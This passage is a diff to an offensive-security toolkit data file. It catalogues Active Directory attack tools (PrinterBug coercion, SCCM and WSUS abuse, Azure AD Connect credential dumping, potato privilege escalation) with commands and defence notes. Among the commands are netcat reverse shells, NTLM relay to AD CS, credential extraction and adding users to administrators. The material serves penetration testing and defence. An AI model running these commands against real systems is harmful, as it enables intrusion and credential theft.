+                                      "Needs a PKINIT-capable KDC (a DC/KDC certificate). PKINIT AS-REQ (4768 with certificate info) from an odd host is the signal.",
+                                      "This is the mechanism behind Shadow Credentials and AD CS abuse — read the Shadow Credentials / PKINIT theory page."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "PKINITtools — GitHub (dirkjanm)",
+                                              "url": "https://github.com/dirkjanm/PKINITtools"
+                                      },
+                                      {
+                                              "label": "Theory — Shadow Credentials, PKINIT & UnPAC",
+                                              "url": "theory/2026-09-24-shadow-credentials-pkinit.html"
+                                      },
+                                      {
+                                              "label": "Theory — AD Certificate Services",
+                                              "url": "theory/2026-08-18-adcs.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "get-gpppassword",
+              "name": "Get-GPPPassword",
+              "url": "https://github.com/p0dalirius/pyGPPPass",
+              "description": "Recovers the AES-encrypted 'cpassword' left in SYSVOL Group Policy Preferences (MS14-025).",
+              "brief": "Group Policy Preferences once let administrators push local accounts and scheduled-task credentials via policy — storing the password as a 'cpassword' in an XML file in the world-readable SYSVOL share. Microsoft published the AES key used to encrypt it (MS14-025), so any authenticated user who finds a cpassword can decrypt it to plaintext. Get-GPPPassword (and its Python ports) hunts SYSVOL for these files and decrypts them.\n\nDespite the 2014 patch removing the feature, legacy cpassword XML frequently lingers in SYSVOL, making this one of the quickest wins on an internal test — a single hit is often a reusable local-admin or service credential.",
+              "quickReference": [
+                      {
+                              "label": "Search SYSVOL (built-in findstr)",
+                              "cmd": "findstr /S /I cpassword \\\\<domain>\\sysvol\\<domain>\\policies\\*.xml"
+                      },
+                      {
+                              "label": "Automated (NetExec)",
+                              "cmd": "nxc smb <dc_ip> -u <user> -p '<pass>' -M gpp_password"
+                      },
+                      {
+                              "label": "PowerSploit / Python",
+                              "cmd": "Get-GPPPassword                 # PowerSploit\ngpp-decrypt <cpassword>          # decrypt a value"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Find and decrypt cpassword",
+                                              "cmd": "nxc smb <dc_ip> -u <user> -p '<pass>' -M gpp_password\n# or manually: findstr /S /I cpassword \\\\<domain>\\sysvol\\...\\*.xml  then gpp-decrypt"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Reading SYSVOL is normal for any domain user, so collection is quiet; the fix is to purge legacy Groups.xml/*.xml cpassword files and rotate any exposed credentials.",
+                                      "Any recovered account is often reused as a local admin — spray it with care for lockout."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "pyGPPPass — GitHub (p0dalirius)",
+                                              "url": "https://github.com/p0dalirius/pyGPPPass"
+                                      },
+                                      {
+                                              "label": "Theory — Group Policy (GPO)",
+                                              "url": "theory/2026-08-18-group-policy.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "spoolsample",
+              "name": "SpoolSample",
+              "url": "https://github.com/leechristensen/SpoolSample",
+              "description": "The 'PrinterBug' coercion tool — forces a host to authenticate to you via MS-RPRN.",
+              "brief": "SpoolSample is the original PrinterBug tool. It calls the Print System Remote Protocol (MS-RPRN) function RpcRemoteFindFirstPrinterChangeNotificationEx against a target running the Print Spooler, telling it to send print-change notifications to a server you name — which makes the target authenticate to that server over SMB. Point it at your relay/capture host and a domain controller will authenticate to you.\n\nCoercion like this is the front half of the classic unconstrained-delegation and NTLM-relay-to-AD CS (ESC8) chains: coerce a DC, relay it, and take the domain. The Spooler runs by default on most Windows hosts, including DCs, which is why disabling it on DCs is a standard hardening step.",
+              "quickReference": [
+                      {
+                              "label": "Coerce a target to you",
+                              "cmd": "SpoolSample.exe <target> <attacker_listener>"
+                      },
+                      {
+                              "label": "Linux equivalent (dementor/printerbug)",
+                              "cmd": "printerbug.py <domain>/<user>:'<pass>'@<target> <attacker_ip>"
+                      },
+                      {
+                              "label": "Then relay or capture",
+                              "cmd": "ntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp --adcs --template DomainController"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Trigger the coercion",
+                                              "cmd": "SpoolSample.exe <dc_or_target> <attacker_host>\n# the target's machine account authenticates to <attacker_host> over SMB"
+                                      },
+                                      {
+                                              "label": "Chain: coerce → relay to AD CS (ESC8)",
+                                              "cmd": "# terminal 1:\nntlmrelayx.py -t http://<ca>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# terminal 2:\nSpoolSample.exe <dc> <relay_host>\n# -> DC certificate -> PKINIT -> DC ticket"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "A DC or server initiating SMB auth to a workstation is a high-fidelity signal — MS-RPRN change-notification to an odd host stands out.",
+                                      "Defence: disable the Print Spooler on DCs and servers that don't print; enforce SMB signing and EPA so the relay fails; consider RPC filters.",
+                                      "Coercer covers this and many other coercion methods (PetitPotam/DFSCoerce) in one tool."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "SpoolSample — GitHub (leechristensen)",
+                                              "url": "https://github.com/leechristensen/SpoolSample"
+                                      },
+                                      {
+                                              "label": "Theory — Coercion & NTLM Relay",
+                                              "url": "theory/2026-08-18-coercion-ntlm-relay.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "sharpsccm",
+              "name": "SharpSCCM",
+              "url": "https://github.com/Mayyhem/SharpSCCM",
+              "description": "Enumerate and abuse SCCM/MECM — recover NAA/secrets, coerce client push, and execute on clients.",
+              "brief": "SharpSCCM is the primary offensive tool for Microsoft Configuration Manager (SCCM/MECM). It talks to the management point and SMS provider to enumerate the hierarchy, request policies, recover the Network Access Account and other stored secrets, trigger client-push authentication (for coercion/relay), and — once you hold an SCCM admin role — execute payloads on managed devices as SYSTEM.\n\nIt is the swiss-army knife behind most of the SCCM lane on the attack-path map: 'get secrets' loots credentials, 'invoke client-push' produces coercible authentication to relay to the SMS provider or site database, and 'exec' turns an admin role into mass code execution. See the SCCM/MECM Abuse theory page for the full workflow.",
+              "quickReference": [
+                      {
+                              "label": "Enumerate devices",
+                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>"
+                      },
+                      {
+                              "label": "Recover NAA / secrets",
+                              "cmd": "SharpSCCM.exe get secrets -r <newcomputer>"
+                      },
+                      {
+                              "label": "Coerce client-push auth",
+                              "cmd": "SharpSCCM.exe invoke client-push -mp <mp> -sc <site_code> -t <relay_ip>"
+                      },
+                      {
+                              "label": "Execute on a device (SYSTEM)",
+                              "cmd": "SharpSCCM.exe exec -d <device> -p '<payload>'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Enumeration",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Map the site and its objects",
+                                              "cmd": "SharpSCCM.exe get devices -sms <SMS_PROVIDER>\nSharpSCCM.exe get collections\nSharpSCCM.exe get site-info"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Credential looting",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Recover the Network Access Account and policy secrets",
+                                              "cmd": "SharpSCCM.exe get secrets -r <newcomputer>\n# registers/impersonates a client, requests machine policy, decrypts the NAA blob"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Coercion & takeover",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Trigger client-push (auth to relay)",
+                                              "cmd": "SharpSCCM.exe invoke client-push -mp <mp> -sc <site_code> -t <relay_ip>\n# relay the site-server/machine auth to the SMS provider (grant Full Admin) or the site DB"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Execution (as SCCM admin)",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Run a payload on a client as SYSTEM",
+                                              "cmd": "SharpSCCM.exe exec -d <device_name> -p '<payload>'\n# or deploy an application/script to a whole collection"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "New device registration followed by policy/NAA retrieval, unexpected Full Administrators, and out-of-band application/script deployments are the key signals.",
+                                      "Defence: PKI/HTTPS + Enhanced HTTP and retire the NAA; disable automatic site-wide client push; treat site systems as Tier 0."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "SharpSCCM — GitHub (Mayyhem)",
+                                              "url": "https://github.com/Mayyhem/SharpSCCM"
+                                      },
+                                      {
+                                              "label": "Theory — SCCM / MECM Abuse",
+                                              "url": "theory/2026-09-24-sccm-mecm-abuse.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "sccmhunter",
+              "name": "sccmhunter",
+              "url": "https://github.com/garrettfoster13/sccmhunter",
+              "description": "Python SCCM recon and attack toolkit — find the hierarchy, request policies and relay from Linux.",
+              "brief": "sccmhunter is a Python toolkit for profiling and attacking SCCM/MECM from Linux. Its 'find' module locates management points, distribution points and site codes via LDAP and HTTP; its 'http' module registers a device and requests policies (including the NAA); and it supports the coercion/relay paths to take over a site — all without needing a Windows host.\n\nIt complements SharpSCCM (the C# tool) and is the go-to when you are operating from a Linux box with only domain credentials. The SCCM/MECM Abuse theory page ties the modules to the overall attack.",
+              "quickReference": [
+                      {
+                              "label": "Find the hierarchy",
+                              "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>"
+                      },
+                      {
+                              "label": "Request policies (NAA)",
+                              "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> ..."
+                      },
+                      {
+                              "label": "Show findings",
+                              "cmd": "sccmhunter.py show -all"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Profile the environment",
+                                              "cmd": "sccmhunter.py find -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip>\nsccmhunter.py show -all"
+                                      },
+                                      {
+                                              "label": "Register a device and pull secrets",
+                                              "cmd": "sccmhunter.py http -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> ...   # request NAA policy"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Same signals as SharpSCCM — device registration + policy requests, admin changes. Defence: Enhanced HTTP, no NAA, Tier-0 site systems."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "sccmhunter — GitHub (garrettfoster13)",
+                                              "url": "https://github.com/garrettfoster13/sccmhunter"
+                                      },
+                                      {
+                                              "label": "Theory — SCCM / MECM Abuse",
+                                              "url": "theory/2026-09-24-sccm-mecm-abuse.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "pxethief",
+              "name": "PXEThief",
+              "url": "https://github.com/MWR-CyberSec/PXEThief",
+              "description": "Extracts and cracks SCCM PXE boot-media credentials — a no-credentials path into the domain.",
+              "brief": "PXEThief targets SCCM operating-system deployment. Where a distribution point offers PXE boot, an unauthenticated attacker on the network can request the boot media, which contains the task-sequence variables — including the Network Access Account and other deployment credentials — encrypted with no password or a weak one. PXEThief downloads that media and recovers or cracks the secrets.\n\nIt is one of the rare SCCM paths that needs zero credentials — only network line-of-sight to a PXE-enabled DP — which makes it a strong opening move on an internal test.",
+              "quickReference": [
+                      {
+                              "label": "Pull & decrypt PXE variables",
+                              "cmd": "pxethief.py 2 <dp_ip>"
+                      },
+                      {
+                              "label": "Crack a set boot password",
+                              "cmd": "hashcat -m 19850 pxe.hash wordlist.txt"
+                      },
+                      {
+                              "label": "List modes",
+                              "cmd": "pxethief.py -h"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Request and decrypt the boot media",
+                                              "cmd": "pxethief.py 2 <dp_ip>\n# recovers task-sequence variables incl. the NAA; if a media password is set, crack it:"
+                                      },
+                                      {
+                                              "label": "Crack the media password",
+                                              "cmd": "hashcat -m 19850 pxe.hash /usr/share/wordlists/rockyou.txt"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Needs no credentials — just reach a PXE-enabled DP. The only signal is a PXE/TFTP boot request from an unknown MAC.",
+                                      "Defence: require a strong PXE password, segment the deployment VLAN, or disable PXE where unused."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "PXEThief — GitHub (MWR-CyberSec)",
+                                              "url": "https://github.com/MWR-CyberSec/PXEThief"
+                                      },
+                                      {
+                                              "label": "Theory — SCCM / MECM Abuse",
+                                              "url": "theory/2026-09-24-sccm-mecm-abuse.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "pywsus",
+              "name": "PyWSUS",
+              "url": "https://github.com/GoSecure/pywsus",
+              "description": "Man-in-the-middle a plaintext-HTTP WSUS channel to deliver a malicious 'update' as SYSTEM.",
+              "brief": "PyWSUS abuses Windows Server Update Services configured over plain HTTP. WSUS clients trust updates that are Microsoft-signed, but they don't validate the transport — so an attacker in a man-in-the-middle position can inject a command that runs a legitimately-signed Microsoft binary (a LOLBin) with attacker-controlled arguments, executing as SYSTEM on the client.\n\nIt requires a MITM position (ARP spoofing, mitm6, or being the configured proxy) between a client and its HTTP WSUS server. The definitive fix is to serve WSUS over HTTPS; PyWSUS simply demonstrates why.",
+              "quickReference": [
+                      {
+                              "label": "Serve a malicious update",
+                              "cmd": "pywsus.py -H <attacker_ip> -p 8530 -c '<signed_lolbin>' -e '<args>'"
+                      },
+                      {
+                              "label": "MITM the client first",
+                              "cmd": "# ARP-spoof or become the proxy so the client's HTTP WSUS traffic reaches you"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Inject the update",
+                                              "cmd": "pywsus.py -H <attacker_ip> -p 8530 \\\n  -c 'C:\\\\Windows\\\\System32\\\\cmd.exe' -e '/c net localgroup administrators <you> /add'\n# combine with a MITM (bettercap/mitm6) so the client's HTTP WSUS request reaches PyWSUS"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Needs a MITM position and an HTTP (not HTTPS) WSUS config. Defence: always run WSUS over TLS; this closes the vector entirely.",
+                                      "WSUSpendu is the alternative when you already control the WSUS server (approve a rogue update server-side)."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "PyWSUS — GitHub (GoSecure)",
+                                              "url": "https://github.com/GoSecure/pywsus"
+                                      },
+                                      {
+                                              "label": "AD Attack-Path map",
+                                              "url": "ad-map.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "wsuspendu",
+              "name": "WSUSpendu",
+              "url": "https://github.com/AlsidOfficial/WSUSpendu",
+              "description": "From a compromised WSUS server, approve a rogue update to push code to its clients.",
+              "brief": "WSUSpendu is the server-side counterpart to a WSUS MITM. If you have compromised a WSUS server, WSUSpendu injects a malicious update directly into its database and approves it for target clients — so the next time those clients check in, they download and run your 'update' as SYSTEM. No MITM position is needed because you already own the update source.\n\nIt effectively turns one compromised WSUS host into code execution across every downstream client, which is why WSUS servers deserve Tier-0-like protection and their downstream scope should be understood during an assessment.",
+              "quickReference": [
+                      {
+                              "label": "Inject & approve a rogue update",
+                              "cmd": "WSUSpendu.ps1 -Inject -PayloadFile <signed.exe> -ComputerName <target_client>"
+                      },
+                      {
+                              "label": "Run on the compromised WSUS host",
+                              "cmd": "# requires admin on the WSUS server"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Push to clients from the WSUS server",
+                                              "cmd": "Import-Module .\\WSUSpendu.ps1\nWSUSpendu -Inject -PayloadFile '<signed_binary>' -PayloadArgs '<args>' -ComputerName '<target_client>'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Unexpected update approvals and BITS-like child processes from wuauclt on clients are the signals.",
+                                      "Defence: treat WSUS servers as high-value, restrict who administers them, and monitor update approvals; segment downstream scope."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "WSUSpendu — GitHub",
+                                              "url": "https://github.com/AlsidOfficial/WSUSpendu"
+                                      },
+                                      {
+                                              "label": "AD Attack-Path map",
+                                              "url": "ad-map.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "aadinternals",
+              "name": "AADInternals",
+              "url": "https://github.com/Gerenios/AADInternals",
+              "description": "PowerShell toolkit for attacking Entra ID / Azure AD and the on-prem hybrid sync bridge.",
+              "brief": "AADInternals is the reference PowerShell toolkit for Entra ID (Azure AD) tradecraft, and the tool that bridges on-prem AD compromise into the cloud. Its most consequential AD use is against Azure AD Connect: from the sync server it recovers the credentials of the sync accounts (the on-prem MSOL_ account and the cloud Directory Synchronization account), which hold sweeping rights on both sides of the hybrid identity.\n\nWith those it can reset passwords, forge SAML tokens (the 'Golden SAML' family via a compromised ADFS token-signing key), and manipulate directory objects — turning a domain compromise into tenant compromise, and vice-versa. It is broad; on an AD engagement the sync-credential recovery is the key hop.",
+              "quickReference": [
+                      {
+                              "label": "Recover sync credentials",
+                              "cmd": "Get-AADIntSyncCredentials"
+                      },
+                      {
+                              "label": "Reset a synced user's password (as MSOL_)",
+                              "cmd": "Set-AADIntUserPassword -SourceAnchor <anchor> -Password '<new>'"
+                      },
+                      {
+                              "label": "Dump ADFS signing key (Golden SAML)",
+                              "cmd": "Export-AADIntADFSSigningCertificate"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Hybrid bridge (Azure AD Connect)",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Recover the sync account secrets (on the AAD Connect server)",
+                                              "cmd": "Import-Module AADInternals\nGet-AADIntSyncCredentials\n# yields the on-prem MSOL_ account and the cloud sync account credentials"
+                                      },
+                                      {
+                                              "label": "Abuse the recovered rights",
+                                              "cmd": "# MSOL_ can DCSync on-prem; the cloud sync account has broad Graph rights\nSet-AADIntUserPassword -SourceAnchor '<immutableId>' -Password '<new>' -Verbose"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "Cloud / federation",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Golden SAML (with the ADFS key)",
+                                              "cmd": "Export-AADIntADFSSigningCertificate\nNew-AADIntSAMLToken -ImmutableID '<id>' -PfxFileName ADFS.pfx -Issuer '<issuer>'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "The MSOL_ account authenticating from an unusual host, and anomalous Entra sign-ins, are the signals.",
+                                      "Defence: treat the AAD Connect server as Tier 0, protect the ADFS token-signing key, and monitor the sync accounts closely."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "AADInternals — GitHub (Gerenios)",
+                                              "url": "https://github.com/Gerenios/AADInternals"
+                                      },
+                                      {
+                                              "label": "Theory — Domain and Forest Trusts",
+                                              "url": "theory/2026-08-18-trusts.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "adconnectdump",
+              "name": "adconnectdump",
+              "url": "https://github.com/fox-it/adconnectdump",
+              "description": "Dumps the Azure AD Connect sync credentials from the sync server's encrypted config.",
+              "brief": "adconnectdump extracts the credentials that Azure AD Connect stores to synchronise identities between on-prem AD and Entra ID. The sync engine keeps the on-prem MSOL_ account and the cloud sync account in an encrypted store (backed by DPAPI and the sync database); adconnectdump decrypts them, giving you two highly-privileged accounts that straddle the hybrid boundary.\n\nThe MSOL_ account typically has directory-replication rights on-prem (i.e. it can DCSync), and the cloud sync account has broad rights in the tenant — so recovering these from the sync server is a direct hop in either direction. It focuses on the extraction; AADInternals is the toolkit for what you do next.",
+              "quickReference": [
+                      {
+                              "label": "Dump on the sync server",
+                              "cmd": "adconnectdump.py"
+                      },
+                      {
+                              "label": "Remote variants",
+                              "cmd": "# supports local (SYSTEM) and remote DPAPI-based extraction methods"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Recover the sync credentials",
+                                              "cmd": "# on / against the Azure AD Connect server:\nadconnectdump.py\n# yields the MSOL_ (on-prem) and cloud sync account credentials"
+                                      },
+                                      {
+                                              "label": "Then use them",
+                                              "cmd": "# MSOL_ -> DCSync on-prem (secretsdump -just-dc)\n# cloud sync account -> tenant manipulation via AADInternals"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Access to the sync server's encrypted config / SQL and DPAPI keys is the signal. Defence: Tier-0 the AAD Connect server; least-privilege the sync accounts where possible."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "adconnectdump — GitHub (fox-it)",
+                                              "url": "https://github.com/fox-it/adconnectdump"
+                                      },
+                                      {
+                                              "label": "Theory — Domain and Forest Trusts",
+                                              "url": "theory/2026-08-18-trusts.html"
+                                      }
+                              ]
+                      }
+              ]
       }
     ]
   },
@@ -6651,6 +7991,480 @@ var TOOLKIT = [
             ]
           }
         ]
+      },
+      {
+              "id": "winpeas",
+              "name": "winPEAS",
+              "url": "https://github.com/peass-ng/PEASS-ng",
+              "description": "Windows local privilege-escalation enumeration — triages misconfigs that lead to SYSTEM.",
+              "brief": "winPEAS (from the PEASS-ng project) is the standard Windows privilege-escalation enumeration script. On a foothold it triages the host for the misconfigurations that lead to SYSTEM: unquoted service paths, weak service and file permissions, AlwaysInstallElevated, autoruns, scheduled tasks, stored credentials, token privileges, and dozens more — colour-coding likely wins.\n\nIt is a first-move tool: run it, read the highlighted findings, then pivot to a targeted exploit (a potato if you hold SeImpersonate, a service hijack, a credential in a config file). It is thorough and therefore noisy on disk/CPU, so on monitored hosts prefer a targeted check or an in-memory runner.",
+              "quickReference": [
+                      {
+                              "label": "Full run (quiet colours)",
+                              "cmd": "winPEASx64.exe quiet"
+                      },
+                      {
+                              "label": "Focused: services / creds",
+                              "cmd": "winPEASx64.exe quiet servicesinfo\nwinPEASx64.exe quiet filesinfo userinfo"
+                      },
+                      {
+                              "label": "Batch/PS variants",
+                              "cmd": "winPEAS.bat        # no binary drop\nInvoke-winPEAS      # PowerShell port"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Enumerate everything",
+                                              "cmd": "winPEASx64.exe quiet\n# review red/yellow highlights: SeImpersonate, writable services, AlwaysInstallElevated, saved creds"
+                                      },
+                                      {
+                                              "label": "Targeted modules",
+                                              "cmd": "winPEASx64.exe quiet systeminfo userinfo servicesinfo applicationsinfo"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "High-value findings it surfaces",
+                              "type": "table",
+                              "columns": [
+                                      "Finding",
+                                      "Leads to"
+                              ],
+                              "rows": [
+                                      [
+                                              "SeImpersonatePrivilege",
+                                              "Potato attack → SYSTEM"
+                                      ],
+                                      [
+                                              "Writable service binary / unquoted path",
+                                              "Service hijack → SYSTEM"
+                                      ],
+                                      [
+                                              "AlwaysInstallElevated",
+                                              "Malicious MSI → SYSTEM"
+                                      ],
+                                      [
+                                              "Stored credentials (cmdkey, files, registry)",
+                                              "Lateral movement / privesc"
+                                      ]
+                              ]
+                      },
+                      {
+                              "title": "OPSEC",
+                              "type": "notes",
+                              "items": [
+                                      "Thorough and loud — heavy filesystem/registry scanning and a dropped binary. On monitored hosts run a specific check or an in-memory variant instead.",
+                                      "Findings feed the privilege-escalation lane of the attack-path map (potatoes, service abuse, UAC bypass)."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "PEASS-ng — GitHub",
+                                              "url": "https://github.com/peass-ng/PEASS-ng"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "printspoofer",
+              "name": "PrintSpoofer",
+              "url": "https://github.com/itm4n/PrintSpoofer",
+              "description": "SeImpersonate → SYSTEM via the print spooler's named pipe — the modern 'potato'.",
+              "brief": "PrintSpoofer escalates a service account that holds SeImpersonatePrivilege to SYSTEM. It coerces the print spooler service to connect to a named pipe the attacker controls, captures the spooler's SYSTEM token as it connects, and impersonates it to spawn a process as SYSTEM. It works on modern Windows where the older RPC/DCOM potatoes were mitigated.\n\nSeImpersonate is held by most service accounts — IIS application pools, MSSQL, and many others — so PrintSpoofer is the standard finisher after landing code execution as such a service. It needs the Spooler service running on the host.",
+              "quickReference": [
+                      {
+                              "label": "Spawn SYSTEM shell",
+                              "cmd": "PrintSpoofer.exe -i -c cmd"
+                      },
+                      {
+                              "label": "Run a command",
+                              "cmd": "PrintSpoofer.exe -c '<payload>'"
+                      },
+                      {
+                              "label": "Check the privilege first",
+                              "cmd": "whoami /priv | findstr SeImpersonate"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Confirm the privilege",
+                                              "cmd": "whoami /priv        # need SeImpersonatePrivilege = Enabled/Available"
+                                      },
+                                      {
+                                              "label": "Escalate to SYSTEM",
+                                              "cmd": "PrintSpoofer.exe -i -c cmd.exe         # interactive SYSTEM shell\nPrintSpoofer.exe -c 'nc.exe <ip> <port> -e cmd.exe'   # or run a payload"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Named-pipe coercion to a local listener then a SYSTEM child process is the signal (Sysmon pipe + process events).",
+                                      "Needs the Spooler running. GodPotato / RoguePotato are alternatives when Spooler is disabled or on different builds."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "PrintSpoofer — GitHub (itm4n)",
+                                              "url": "https://github.com/itm4n/PrintSpoofer"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "godpotato",
+              "name": "GodPotato",
+              "url": "https://github.com/BeichenDream/GodPotato",
+              "description": "SeImpersonate → SYSTEM via a DCOM/RPC token trick that works across modern Windows builds.",
+              "brief": "GodPotato is a broadly-compatible member of the 'potato' family: it abuses a DCOM/RPC mechanism to obtain and impersonate a SYSTEM token from a service account holding SeImpersonatePrivilege, spawning a process as SYSTEM. Its selling point is coverage — it works across a wide range of Windows versions where earlier potatoes are patched, and it does not depend on the print spooler.\n\nReach for it when PrintSpoofer fails (Spooler disabled) or the target build is awkward. As with all potatoes, the prerequisite is a token that holds SeImpersonate.",
+              "quickReference": [
+                      {
+                              "label": "Run a command as SYSTEM",
+                              "cmd": "GodPotato.exe -cmd 'cmd /c whoami'"
+                      },
+                      {
+                              "label": "Spawn a shell",
+                              "cmd": "GodPotato.exe -cmd 'cmd /c nc.exe <ip> <port> -e cmd.exe'"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
+                              "type": "commands",
+                              "commands": [
+                                      {
+                                              "label": "Escalate",
+                                              "cmd": "GodPotato.exe -cmd 'cmd /c whoami'      # should print nt authority\\system\nGodPotato.exe -cmd 'cmd /c net localgroup administrators <you> /add'"
+                                      }
+                              ]
+                      },
+                      {
+                              "title": "OPSEC & defence",
+                              "type": "notes",
+                              "items": [
+                                      "Broad Windows coverage and no Spooler dependency. Signal: token manipulation + a SYSTEM child from a service process.",
+                                      "Defence: minimise accounts holding SeImpersonate; run services least-privileged; EDR generally flags known potato binaries."
+                              ]
+                      },
+                      {
+                              "title": "References",
+                              "type": "references",
+                              "items": [
+                                      {
+                                              "label": "GodPotato — GitHub (BeichenDream)",
+                                              "url": "https://github.com/BeichenDream/GodPotato"
+                                      },
+                                      {
+                                              "label": "Theory — Windows Access Tokens & UAC",
+                                              "url": "theory/2026-08-18-windows-tokens-uac.html"
+                                      }
+                              ]
+                      }
+              ]
+      },
+      {
+              "id": "roguepotato",
+              "name": "RoguePotato",
+              "url": "https://github.com/antonioCoco/RoguePotato",
+              "description": "SeImpersonate → SYSTEM via a redirected OXID resolver — the JuicyPotato successor.",
+              "brief": "RoguePotato is the successor to JuicyPotato for builds where Microsoft mitigated the original. It abuses DCOM/NTLM by redirecting the OXID resolver through an attacker-controlled RPC endpoint on port 135, recovering a SYSTEM token from a SeImpersonate-holding service account and impersonating it to run code as SYSTEM.\n\nIt typically needs a socat/network redirector so the OXID resolution reaches your fake resolver. Like the other potatoes, the prerequisite is SeImpersonatePrivilege; pick whichever potato works on the target's build.",
+              "quickReference": [
+                      {
+                              "label": "Run as SYSTEM",
+                              "cmd": "RoguePotato.exe -r <redirector_ip> -e '<payload>' -l 9999"
+                      },
+                      {
+                              "label": "Redirector (on your host)",
+                              "cmd": "socat tcp-listen:135,reuseaddr,fork tcp:<target>:9999"
+                      }
+              ],
+              "sections": [
+                      {
+                              "title": "Usage",
